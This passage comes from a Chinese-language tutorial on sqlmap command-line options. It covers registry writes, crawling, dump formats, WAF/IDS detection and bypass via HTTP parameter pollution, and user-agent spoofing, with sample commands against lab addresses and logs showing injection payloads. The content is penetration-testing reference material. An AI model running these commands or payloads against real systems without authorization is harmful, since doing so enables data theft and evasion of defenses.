+<h4 id="注册表辅助选项"><a href="#注册表辅助选项" class="headerlink" title="注册表辅助选项"></a>注册表辅助选项</h4><p>参数：<code>--reg-key，--reg-value，--reg-data，--reg-type</code></p>
+<p>需要配合之前三个参数使用，例子：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1</span><br><span class="line">--reg-add --reg-key=<span class="string">"HKEY_LOCAL_MACHINE\\SOFTWARE\\sqlmap"</span> --reg-value=Test</span><br><span class="line">--reg-type=REG_SZ --reg-data=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="常规参数"><a href="#常规参数" class="headerlink" title="常规参数"></a>常规参数</h3><h4 id="从sqlite中读取session"><a href="#从sqlite中读取session" class="headerlink" title="从sqlite中读取session"></a>从sqlite中读取session</h4><p>参数：<code>-s</code></p>
+<p><code>sqlmap</code>对每一个目标都会在<code>output</code>路径下自动生成一个<code>SQLite</code>文件，如果用户想指定读取的文件路径，就可以用这个参数。</p>
+<h4 id="保存HTTP-S-日志"><a href="#保存HTTP-S-日志" class="headerlink" title="保存HTTP(S)日志"></a>保存HTTP(S)日志</h4><p>参数：<code>-t</code></p>
+<p>这个参数需要跟一个文本文件，<code>sqlmap</code>会把<code>HTTP(S)</code>请求与响应的日志保存到那里。</p>
+<h4 id="非交互模式"><a href="#非交互模式" class="headerlink" title="非交互模式"></a>非交互模式</h4><p>参数：<code>--batch</code></p>
+<p>用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</p>
+<h4 id="强制使用字符编码"><a href="#强制使用字符编码" class="headerlink" title="强制使用字符编码"></a>强制使用字符编码</h4><p>参数：<code>--charset</code></p>
+<p>不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--charset=GBK</span><br></pre></td></tr></table></figure>
+
+<h4 id="爬行网站URL"><a href="#爬行网站URL" class="headerlink" title="爬行网站URL"></a>爬行网站URL</h4><p>参数：<code>--crawl</code></p>
+<p><code>sqlmap</code>可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。</p>
+<p>例子：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://192.168.21.128/sqlmap/mysql/"</span> --batch --crawl=<span class="number">3</span></span><br><span class="line">[...]</span><br><span class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">53</span>] [INFO] starting crawler</span><br><span class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">53</span>] [INFO] searching <span class="keyword">for</span> links with depth <span class="number">1</span></span><br><span class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">53</span>] [WARNING] running <span class="keyword">in</span> a single-thread mode. This could take a <span class="keyword">while</span></span><br><span class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">53</span>] [INFO] searching <span class="keyword">for</span> links with depth <span class="number">2</span></span><br><span class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">54</span>] [INFO] heuristics detected web page charset <span class="string">'ascii'</span></span><br><span class="line">[<span class="string">xx:</span><span class="string">xx:</span><span class="number">00</span>] [INFO] <span class="number">42</span>/<span class="number">56</span> links visited (<span class="number">75</span>%)</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<h4 id="规定输出到CSV中的分隔符"><a href="#规定输出到CSV中的分隔符" class="headerlink" title="规定输出到CSV中的分隔符"></a>规定输出到CSV中的分隔符</h4><p>参数：<code>--csv-del</code></p>
+<p>当dump保存为CSV格式时<code>（--dump-format=CSV）</code>，需要一个分隔符默认是逗号，用户也可以改为别的<br>如：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">--csv-del</span>=”<span class="comment">;”</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="DBMS身份验证"><a href="#DBMS身份验证" class="headerlink" title="DBMS身份验证"></a>DBMS身份验证</h4><p>参数：<code>--dbms-cred</code></p>
+<p>某些时候当前用户的权限不够，做某些操作会失败，如果知道高权限用户的密码，可以使用此参数，有的数据库有专门的运行机制，可以切换用户如<code>MicrosoftSQL Server的OPENROWSET</code>函数</p>
+<h4 id="定义dump数据的格式"><a href="#定义dump数据的格式" class="headerlink" title="定义dump数据的格式"></a>定义dump数据的格式</h4><p>参数：<code>--dump-format</code></p>
+<p>输出的格式可定义为：<code>CSV，HTML，SQLITE</code></p>
+<h4 id="预估完成时间"><a href="#预估完成时间" class="headerlink" title="预估完成时间"></a>预估完成时间</h4><p>参数：<code>--eta</code></p>
+<p>可以计算注入数据的剩余时间。</p>
+<p>例如<code>Oracle</code>的布尔型盲注：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u</span><br><span class="line">&quot;http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1&quot; -b --eta</span><br><span class="line">[...]</span><br><span class="line">[hh:mm:01] [INFO] the back-end DBMS is Oracle</span><br><span class="line">[hh:mm:01] [INFO] fetching banner</span><br><span class="line">[hh:mm:01] [INFO] retrieving the length of query output</span><br><span class="line">[hh:mm:01] [INFO] retrieved: 64</span><br><span class="line">17% [========\&gt; ] 11/64 ETA 00:19</span><br></pre></td></tr></table></figure>
+
+<p>然后：<br>100% [===================================================] 64/64<br>[hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release<br>10.2.0.1.0 - Prod<br>web application technology: PHP 5.2.6, Apache 2.2.9<br>back-end DBMS: Oracle<br>banner: ‘Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod’<br>sqlmap先输出长度，预计完成时间，显示百分比，输出字符</p>
+<h4 id="刷新session文件"><a href="#刷新session文件" class="headerlink" title="刷新session文件"></a>刷新session文件</h4><p>参数：<code>--flush-session</code></p>
+<p>如果不想用之前缓存这个目标的session文件，可以使用这个参数。<br>会清空之前的session，重新测试该目标。</p>
+<h4 id="自动获取form表单测试"><a href="#自动获取form表单测试" class="headerlink" title="自动获取form表单测试"></a>自动获取form表单测试</h4><p>参数：<code>--forms</code></p>
+<p>如果你想对一个页面的form表单中的参数测试，可以使用-r参数读取请求文件，或者通过–data参数测试。但是当使用–forms参数时，sqlmap会自动从-u中的url获取页面中的表单进行测试。</p>
+<p>####忽略在会话中储存的查询结果</p>
+<p>参数：<code>--fresh-queries</code></p>
+<p>####使用DBMS的hex函数</p>
+<p>参数：<code>--hex</code></p>
+<p>有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免：</p>
+<p>针对<code>PostgreSQL</code>例子：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1"</span></span><br><span class="line">--banner --hex -v <span class="number">3</span> --parse-errors</span><br><span class="line">[...]</span><br><span class="line">[xx:xx:<span class="number">14</span>] [INFO] fetching banner</span><br><span class="line">[xx:xx:<span class="number">14</span>] [PAYLOAD] <span class="number">1</span> AND</span><br><span class="line"><span class="number">5849</span>=CAST((CHR(<span class="number">58</span>)\|\|CHR(<span class="number">118</span>)\|\|CHR(<span class="number">116</span>)\|\|CHR(<span class="number">106</span>)\|\|CHR(<span class="number">58</span>))\|\|(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION()</span><br><span class="line">AS</span><br><span class="line">CHARACTER(<span class="number">10000</span>)),(CHR(<span class="number">32</span>)))),(CHR(<span class="number">85</span>)\|\|CHR(<span class="number">84</span>)\|\|CHR(<span class="number">70</span>)\|\|CHR(<span class="number">56</span>))),(CHR(<span class="number">72</span>)\|\|CHR(<span class="number">69</span>)\|\|CHR(<span class="number">88</span>))))::text\|\|(CHR(<span class="number">58</span>)\|\|CHR(<span class="number">110</span>)\|\|CHR(<span class="number">120</span>)\|\|CHR(<span class="number">98</span>)\|\|CHR(<span class="number">58</span>))</span><br><span class="line">AS NUMERIC)</span><br><span class="line">[xx:xx:<span class="number">15</span>] [INFO] parsed error message: <span class="string">'pg_query() [\&lt;a</span></span><br><span class="line"><span class="string">href='</span>function.pg-query<span class="string">'\&gt;function.pg-query\&lt;/a\&gt;]: Query failed: ERROR: invalid</span></span><br><span class="line"><span class="string">input syntax for type numeric:</span></span><br><span class="line"><span class="string">":vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:"</span></span><br><span class="line"><span class="string">in \&lt;b\&gt;/var/www/sqlmap/libs/pgsql.inc.php\&lt;/b\&gt; on line \&lt;b\&gt;35\&lt;/b\&gt;'</span></span><br><span class="line">[xx:xx:<span class="number">15</span>] [INFO] retrieved: PostgreSQL <span class="number">8.3</span><span class="number">.9</span> on i486-pc-linux-gnu, compiled by</span><br><span class="line">GCC gcc<span class="number">-4.3</span>.real (Debian <span class="number">4.3</span><span class="number">.2</span><span class="number">-1.1</span>) <span class="number">4.3</span><span class="number">.2</span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<h4 id="自定义输出路径"><a href="#自定义输出路径" class="headerlink" title="自定义输出路径"></a>自定义输出路径</h4><p>参数：<code>--output-dir</code></p>
+<p>sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径<br>例如：<code>--output-dir=/tmp</code></p>
+<h4 id="从响应中获取DBMS的错误信息"><a href="#从响应中获取DBMS的错误信息" class="headerlink" title="从响应中获取DBMS的错误信息"></a>从响应中获取DBMS的错误信息</h4><p>参数：<code>--parse-errors</code></p>
+<p>有时目标没有关闭DBMS的报错，当数据库语句错误时，会输出错误语句，用词参数可以会显出错误信息。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1"</span></span><br><span class="line">--parse-errors</span><br><span class="line">[...]</span><br><span class="line">[<span class="number">11</span>:<span class="number">12</span>:<span class="number">17</span>] [INFO] ORDER BY technique seems to be usable. This should reduce the</span><br><span class="line">time needed to find the right number of query columns. Automatically extending</span><br><span class="line">the range <span class="keyword">for</span> current UNION query injection technique test</span><br><span class="line">[<span class="number">11</span>:<span class="number">12</span>:<span class="number">17</span>] [INFO] parsed error message: <span class="string">'Microsoft OLE DB Provider for ODBC</span></span><br><span class="line"><span class="string">Drivers (0x80040E14)</span></span><br><span class="line"><span class="string">[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10</span></span><br><span class="line"><span class="string">is out of range of the number of items in the select list.</span></span><br><span class="line"><span class="string">\&lt;b\&gt;/sqlmap/mssql/iis/get_int.asp, line 27\&lt;/b\&gt;'</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">12</span>:<span class="number">17</span>] [INFO] parsed error message: <span class="string">'Microsoft OLE DB Provider for ODBC</span></span><br><span class="line"><span class="string">Drivers (0x80040E14)</span></span><br><span class="line"><span class="string">[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is</span></span><br><span class="line"><span class="string">out of range of the number of items in the select list.</span></span><br><span class="line"><span class="string">\&lt;b\&gt;/sqlmap/mssql/iis/get_int.asp, line 27\&lt;/b\&gt;'</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">12</span>:<span class="number">17</span>] [INFO] parsed error message: <span class="string">'Microsoft OLE DB Provider for ODBC</span></span><br><span class="line"><span class="string">Drivers (0x80040E14)</span></span><br><span class="line"><span class="string">[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is</span></span><br><span class="line"><span class="string">out of range of the number of items in the select list.</span></span><br><span class="line"><span class="string">\&lt;b\&gt;/sqlmap/mssql/iis/get_int.asp, line 27\&lt;/b\&gt;'</span></span><br><span class="line">[<span class="number">11</span>:<span class="number">12</span>:<span class="number">17</span>] [INFO] target URL appears to have <span class="number">3</span> columns <span class="keyword">in</span> query</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他的一些参数"><a href="#其他的一些参数" class="headerlink" title="其他的一些参数"></a>其他的一些参数</h3><h4 id="使用参数缩写"><a href="#使用参数缩写" class="headerlink" title="使用参数缩写"></a>使用参数缩写</h4><p>参数：<code>-z</code></p>
+<p>有使用参数太长太复杂，可以使用缩写模式。 例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u</span><br><span class="line"><span class="string">"www.target.com/vuln.php?id=1"</span></span><br></pre></td></tr></table></figure>
+
+<p>可以写成：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -z <span class="string">"bat,randoma,ign,tec=BEU"</span> -u <span class="string">"www.target.com/vuln.php?id=1"</span></span><br></pre></td></tr></table></figure>
+
+<p>还有：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testdb</span><br><span class="line">-T users -u <span class="string">"www.target.com/vuln.php?id=1"</span></span><br></pre></td></tr></table></figure>
+
+<p>可以写成：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -z <span class="string">"ign,flu,bat,tec=U,dump,D=testdb,T=users"</span> -u</span><br><span class="line"><span class="string">"www.target.com/vuln.php?id=1"</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="成功sql注入时警告"><a href="#成功sql注入时警告" class="headerlink" title="成功sql注入时警告"></a>成功sql注入时警告</h4><p>参数：<code>--alert</code></p>
+<h4 id="设定会发的答案"><a href="#设定会发的答案" class="headerlink" title="设定会发的答案"></a>设定会发的答案</h4><p>参数：<code>–answers</code></p>
+<p>当希望<code>sqlmap</code>提出输入时，自动输入自己想要的答案可以使用此参数： 例子：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u</span><br><span class="line"><span class="string">"http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"</span>--technique=E</span><br><span class="line">--answers=<span class="string">"extending=N"</span> --batch</span><br><span class="line">[...]</span><br><span class="line">[xx:xx:<span class="number">56</span>] [INFO] testing <span class="keyword">for</span> SQL injection on GET parameter <span class="string">'id'</span></span><br><span class="line">heuristic (parsing) test showed that the back-end DBMS could be <span class="string">'MySQL'</span>. Do you</span><br><span class="line">want to skip test payloads specific for other DBMSes? [Y/n] Y</span><br><span class="line">[xx:xx:<span class="number">56</span>] [INFO] do you want to include all tests <span class="keyword">for</span> <span class="string">'MySQL'</span> extending</span><br><span class="line">provided level (1) and risk (1)? [Y/n] N</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<h4 id="发现sql注入时发出蜂鸣声"><a href="#发现sql注入时发出蜂鸣声" class="headerlink" title="发现sql注入时发出蜂鸣声"></a>发现sql注入时发出蜂鸣声</h4><p>参数：<code>--beep</code></p>
+<p>发现sql注入时，发出蜂鸣声。</p>
+<h4 id="启发式检测WAF-IPS-IDS保护"><a href="#启发式检测WAF-IPS-IDS保护" class="headerlink" title="启发式检测WAF/IPS/IDS保护"></a>启发式检测WAF/IPS/IDS保护</h4><p>参数：<code>--check-waf</code></p>
+<p><code>WAF/IPS/IDS</code>保护可能会对<code>sqlmap</code>造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。<code>sqlmap</code>将会使用一个不存在的参数来注入测试</p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;foobar=AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables</span><br><span class="line">WHERE 2&gt;1</span><br></pre></td></tr></table></figure>
+
+<p>如果有保护的话可能返回结果会不同。</p>
+<h4 id="清理sqlmap的UDF-s-和表"><a href="#清理sqlmap的UDF-s-和表" class="headerlink" title="清理sqlmap的UDF(s)和表"></a>清理sqlmap的UDF(s)和表</h4><p>参数：<code>--cleanup</code></p>
+<p>清除sqlmap注入时产生的udf与表。</p>
+<h4 id="禁用色彩输出"><a href="#禁用色彩输出" class="headerlink" title="禁用色彩输出"></a>禁用色彩输出</h4><p>参数：<code>--disable-coloring</code></p>
+<p>sqlmap默认彩色输出，可以使用此参数，禁掉彩色输出。</p>
+<h4 id="使用指定的Google结果页面"><a href="#使用指定的Google结果页面" class="headerlink" title="使用指定的Google结果页面"></a>使用指定的Google结果页面</h4><p>参数：<code>--gpage</code></p>
+<p>默认sqlmap使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试。</p>
+<h4 id="使用HTTP参数污染"><a href="#使用HTTP参数污染" class="headerlink" title="使用HTTP参数污染"></a>使用HTTP参数污染</h4><p>参数：<code>--hpp</code></p>
+<p>HTTP参数污染可能会绕过<code>WAF/IPS/IDS</code>保护机制，这个对<code>ASP/IIS与ASP.NET/IIS</code>平台很有效。</p>
+<h4 id="测试WAF-IPS-IDS保护"><a href="#测试WAF-IPS-IDS保护" class="headerlink" title="测试WAF/IPS/IDS保护"></a>测试WAF/IPS/IDS保护</h4><p>参数：<code>--identify-waf</code></p>
+<p>sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。</p>
+<p>例如对一个受到ModSecurity WAF保护的MySQL例子：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://192.168.21.128/sqlmap/mysql/get_int.php?id=1"</span></span><br><span class="line">--identify-waf -v <span class="number">3</span></span><br><span class="line">[...]</span><br><span class="line">[xx:xx:<span class="number">23</span>] [INFO] testing connection to the target URL</span><br><span class="line">[xx:xx:<span class="number">23</span>] [INFO] heuristics detected web page charset <span class="string">'ascii'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection</span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'USP Secure Entry Server</span></span><br><span class="line"><span class="string">(United Security Providers)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'BinarySEC Web Application</span></span><br><span class="line"><span class="string">Firewall (BinarySEC)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'NetContinuum Web</span></span><br><span class="line"><span class="string">Application Firewall (NetContinuum/Barracuda Networks)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'Hyperguard Web Application</span></span><br><span class="line"><span class="string">Firewall (art of defence Inc.)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'Cisco ACE XML Gateway</span></span><br><span class="line"><span class="string">(Cisco Systems)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'TrafficShield (F5</span></span><br><span class="line"><span class="string">Networks)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'Teros/Citrix Application</span></span><br><span class="line"><span class="string">Firewall Enterprise (Teros/Citrix Systems)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'KONA Security Solutions</span></span><br><span class="line"><span class="string">(Akamai Technologies)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'Incapsula Web Application</span></span><br><span class="line"><span class="string">Firewall (Incapsula/Imperva)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'CloudFlare Web Application</span></span><br><span class="line"><span class="string">Firewall (CloudFlare)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'Barracuda Web Application</span></span><br><span class="line"><span class="string">Firewall (Barracuda Networks)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'webApp.secure (webScurity)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'Proventia Web Application</span></span><br><span class="line"><span class="string">Security (IBM)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] declared web page charset <span class="string">'iso-8859-1'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] page <span class="keyword">not</span> found (<span class="number">404</span>)</span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'KS-WAF (Knownsec)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'NetScaler (Citrix Systems)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'Jiasule Web Application</span></span><br><span class="line"><span class="string">Firewall (Jiasule)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'WebKnight Application</span></span><br><span class="line"><span class="string">Firewall (AQTRONIX)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'AppWall (Radware)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [DEBUG] checking <span class="keyword">for</span> WAF/IDS/IPS product <span class="string">'ModSecurity: Open Source</span></span><br><span class="line"><span class="string">Web Application Firewall (Trustwave)'</span></span><br><span class="line">[xx:xx:<span class="number">23</span>] [CRITICAL] WAF/IDS/IPS identified <span class="string">'ModSecurity: Open Source Web</span></span><br><span class="line"><span class="string">Application Firewall (Trustwave)'</span>. Please consider usage of tamper scripts</span><br><span class="line">(option <span class="string">'--tamper'</span>)</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<h4 id="模仿智能手机"><a href="#模仿智能手机" class="headerlink" title="模仿智能手机"></a>模仿智能手机</h4><p>参数：<code>--mobile</code></p>
+<p>有时服务端只接收移动端的访问，此时可以设定一个手机的<code>User-Agent</code>来模仿手机登陆。</p>
+<p>例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py -u <span class="string">"http://www.target.com/vuln.php?id=1"</span> --mobile</span><br><span class="line">[...]</span><br><span class="line">which smartphone do you want sqlmap to imitate through HTTP User-Agent header?</span><br><span class="line">[<span class="number">1</span>] Apple iPhone <span class="number">4</span>s (default)</span><br><span class="line">[<span class="number">2</span>] BlackBerry <span class="number">9900</span></span><br><span class="line">[<span class="number">3</span>] Google Nexus <span class="number">7</span></span><br><span class="line">[<span class="number">4</span>] HP iPAQ <span class="number">6365</span></span><br><span class="line">[<span class="number">5</span>] HTC Sensation</span><br><span class="line">[<span class="number">6</span>] Nokia N97</span><br><span class="line">[<span class="number">7</span>] Samsung Galaxy S</span><br><span class="line">\&gt; <span class="number">1</span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<h4 id="安全的删除output目录的文件"><a href="#安全的删除output目录的文件" class="headerlink" title="安全的删除output目录的文件"></a>安全的删除output目录的文件</h4><p>参数：<code>--purge-output</code></p>
+<p>有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。</p>
+<p>例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py --purge-output -v <span class="number">3</span></span><br><span class="line">[...]</span><br><span class="line">[xx:xx:<span class="number">55</span>] [INFO] purging content of directory <span class="string">'/home/user/sqlmap/output'</span>...</span><br><span class="line">[xx:xx:<span class="number">55</span>] [DEBUG] changing file attributes</span><br><span class="line">[xx:xx:<span class="number">55</span>] [DEBUG] writing random data to files</span><br><span class="line">[xx:xx:<span class="number">55</span>] [DEBUG] truncating files</span><br><span class="line">[xx:xx:<span class="number">55</span>] [DEBUG] renaming filenames to random values</span><br><span class="line">[xx:xx:<span class="number">55</span>] [DEBUG] renaming directory names to random values</span><br><span class="line">[xx:xx:<span class="number">55</span>] [DEBUG] deleting the whole directory tree</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<h4 id="启发式判断注入"><a href="#启发式判断注入" class="headerlink" title="启发式判断注入"></a>启发式判断注入</h4><p>参数：<code>--smart</code></p>
+<p>有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。</p>
+<p>例子：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 